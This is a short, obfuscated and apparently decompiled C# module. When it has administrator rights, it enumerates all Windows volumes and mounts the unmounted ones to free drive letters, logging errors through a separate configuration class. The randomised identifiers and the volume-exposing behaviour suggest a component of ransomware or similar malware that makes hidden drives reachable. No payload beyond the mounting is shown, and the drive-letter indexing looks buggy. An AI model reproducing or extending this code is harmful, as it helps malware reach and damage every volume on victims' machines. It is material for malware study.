using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace nLpTFjJRwUBp;

public static class eahBLKlIKrySGOeNR
{
	public enum LrSsnYIOad : uint
	{
		UyUxKGnXjIkv,
		IRHWdAKUvAcKIr,
		wSriTRCnSk,
		CSizlNddBNly,
		QzCSqjgaBtaw,
		FzrNhulTUtqLP,
		wuYjOCwxhGHlvh
	}

	[CompilerGenerated]
	private sealed class PaFsROlUaGQo
	{
		public uint LLmrGLgXhTPPGQ;

		public uint cKtDfzKETTL;

		public char[] SxVXvYZXuO;

		public bool _003CMountVolumes_003Eb__0(string volumeName)
		{
			if (GetVolumePathNamesForVolumeNameW(volumeName, SxVXvYZXuO, cKtDfzKETTL, ref LLmrGLgXhTPPGQ))
			{
				return SxVXvYZXuO.Length != 3;
			}
			return true;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern LrSsnYIOad GetDriveType([MarshalAs(UnmanagedType.LPStr)] string bZmNdgRGbFoU);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string dUQjgGzwekRQUBI, char[] xXxqAtNVJTx, uint aZmaogKyvHOIpQ, ref uint riAZeUqhsVq);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string OlBTXCLMaAv, string DooXGjinsUpR);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder aGJKCCrNWPBphC, int WZewuCvRXoRE);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int DSxZwwoDMsinX, StringBuilder BDgxczSBRlBMvOk, int DtpfvEPLthiw);

	public static List<string> hQeHGpZJZknBbI()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int dSxZwwoDMsinX = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(dSxZwwoDMsinX, stringBuilder, 1024));
		return list;
	}

	public static void KdFycarNZvYYJN()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string[] array = new string[26]
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "C:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == LrSsnYIOad.IRHWdAKUvAcKIr)
				{
					array2[num++] = text;
				}
			}
			List<string> source = hQeHGpZJZknBbI();
			uint LLmrGLgXhTPPGQ = 0u;
			uint cKtDfzKETTL = 120u;
			char[] SxVXvYZXuO = new char[260];
			foreach (string item in source.Where((string volumeName) => !GetVolumePathNamesForVolumeNameW(volumeName, SxVXvYZXuO, cKtDfzKETTL, ref LLmrGLgXhTPPGQ) || SxVXvYZXuO.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (RLgUMHIwwGSuCLo.nSLCvWTPGScIDK)
				{
					try
					{
						Console.WriteLine("Drive Mounted: {0}", array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (RLgUMHIwwGSuCLo.QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(RLgUMHIwwGSuCLo.kOKakAljNFiEE, "Error while mounting network drives: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
